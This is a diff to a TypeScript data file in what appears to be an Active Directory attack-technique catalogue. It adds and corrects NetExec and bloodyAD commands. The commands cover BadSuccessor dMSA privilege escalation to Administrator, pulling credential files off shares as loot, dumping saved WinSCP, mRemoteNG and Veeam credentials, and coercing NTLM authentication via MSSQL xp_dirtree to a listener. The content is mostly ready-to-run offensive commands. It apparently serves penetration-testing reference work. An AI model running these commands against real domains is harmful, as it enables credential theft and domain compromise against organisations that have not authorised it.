@@ -51,7 +51,7 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     commands: [
       { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 add badSuccessor <dmsa-name>', lang: 'bash' },
       { label: 'Check the domain for exploitable dMSA OUs', code: r`netexec ldap dc01.corp.local -u user -p 'Password1' -M badsuccessor`, lang: 'bash' },
-      { label: 'Create + link a dMSA to a target, then request its TGT', code: r`bloodyAD --host dc01.corp.local -d corp.local -u user -p 'Password1' add dMSA evilDMSA 'OU=Eval,DC=corp,DC=local'`, lang: 'bash' },
+      { label: 'Create the dMSA and link it to a target whose SIDs it inherits', code: r`bloodyAD --host dc01.corp.local -d corp.local -u user -p 'Password1' add badSuccessor evilDMSA --ou 'OU=Eval,DC=corp,DC=local' -t 'CN=Administrator,CN=Users,DC=corp,DC=local'`, lang: 'bash' },
     ],
     mitre: mitre('T1078.002'),
     references: [
@@ -60,6 +60,8 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     ],
     requires: ['CreateChild on an OU, or write over a dMSA object', 'At least one Windows Server 2025 Domain Controller'],
     opsec: 'New dMSA objects and changes to msDS-ManagedAccountPrecededByLink / msDS-DelegatedMSAState are high-signal once detections exist (4662/5136). Stealthy where dMSA auditing is absent.',
+    versions: ['srv2025'],
+    affects: 'Server 2025 only; dMSAs are a Windows Server 2025 feature.',
     difficulty: 'medium',
   },
   {
@@ -83,6 +85,8 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     ],
     requires: ['Network access to TCP/445 on an unpatched Win10 / Server 1903-1909 host'],
     opsec: 'The kernel exploit is crash-prone (BSOD on failure) and loud; the vuln check itself is a benign protocol negotiation. Patched everywhere current, so legacy-host only.',
+    versions: ['win10-1903', 'win10-1909'],
+    affects: 'Windows 10 / Server 1903-1909 only; the SMBv3.1.1 compression handler shipped in build 1903 and the bug was patched out of later builds.',
     difficulty: 'hard',
   },
   {
@@ -101,6 +105,7 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
       { label: 'Inventory readable shares to JSON', code: r`netexec smb 10.0.0.0/24 -u user -p 'Password1' -M spider_plus`, lang: 'bash' },
       { label: 'Spider + download everything', code: r`netexec smb 10.0.0.0/24 -u user -p 'Password1' -M spider_plus -o DOWNLOAD_FLAG=True`, lang: 'bash' },
       { label: 'Built-in: grep share contents for "password"', code: r`netexec smb 10.0.0.20 -u user -p 'Password1' --spider SHARE --content --pattern password`, lang: 'bash' },
+      { label: 'Grab a specific file off a share (NetExec)', code: r`nxc smb <host> -u user -p pass --get-file \Windows\Temp\creds.txt loot.txt`, lang: 'bash' },
     ],
     mitre: mitre('T1552.001'),
     references: [
@@ -176,6 +181,7 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     commands: [
       { label: 'Decrypt mRemoteNG saved creds', code: r`netexec smb 10.0.0.20 -u admin -p 'Password1' -M mremoteng`, lang: 'bash' },
       { label: 'Dump Veeam backup credentials', code: r`netexec smb 10.0.0.20 -u admin -p 'Password1' -M veeam`, lang: 'bash' },
+      { label: 'Dump WinSCP saved sessions (NetExec)', code: r`nxc smb <host> -u user -p pass -M winscp`, lang: 'bash' },
     ],
     mitre: mitre('T1555.005'),
     references: [
@@ -201,7 +207,7 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     commands: [
       { label: 'Coerce via xp_dirtree (interactive)', code: r`mssqlclient.py domain.local/user:'Password1'@10.0.0.30
 SQL> EXEC master..xp_dirtree '\\10.0.0.66\share',1,1`, lang: 'bash' },
-      { label: 'Coerce over NetExec', code: r`nxc mssql 10.0.0.30 -u user -p 'Password1' -x "EXEC master..xp_dirtree '\\10.0.0.66\share',1,1"`, lang: 'bash' },
+      { label: 'Coerce over NetExec', code: r`nxc mssql 10.0.0.30 -u user -p 'Password1' -q "EXEC master..xp_dirtree '\\10.0.0.66\share',1,1"`, lang: 'bash' },
     ],
     requires: ['Any MSSQL login (sysadmin not required)', 'A listener (Responder / ntlmrelayx) to catch the auth', 'MSSQL (1433) reachable'],
     mitre: mitre('T1187'),
